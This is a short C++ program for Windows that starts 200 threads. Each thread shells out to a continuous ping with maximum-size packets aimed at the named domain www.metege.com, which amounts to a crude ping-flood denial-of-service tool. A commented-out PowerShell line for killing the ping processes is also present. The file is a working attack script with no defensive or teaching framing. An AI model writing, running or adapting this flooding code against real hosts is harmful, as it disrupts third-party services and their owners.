#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
string cmd = "ping www.metege.com -l 65500 -t -i 112";
// string cmd = "Get-Process -Name ping | foreach-object{$_.kill()}";

// void func() {

// }
DWORD WINAPI Func(LPVOID lpParameter)
{
    cout << "thread function Fun1Proc!\n";
    system(cmd.c_str());

    return 0;
}

int main(int argc, char const *argv[]) {
    // HANDLE ts[100];
    for (int i=0; i<200; i++) {
        HANDLE ts = CreateThread(NULL, 0, Func, NULL, 0, NULL);
    }
    // Sleep(10);
    
    // system(cmd.c_str());
    return 0;
}
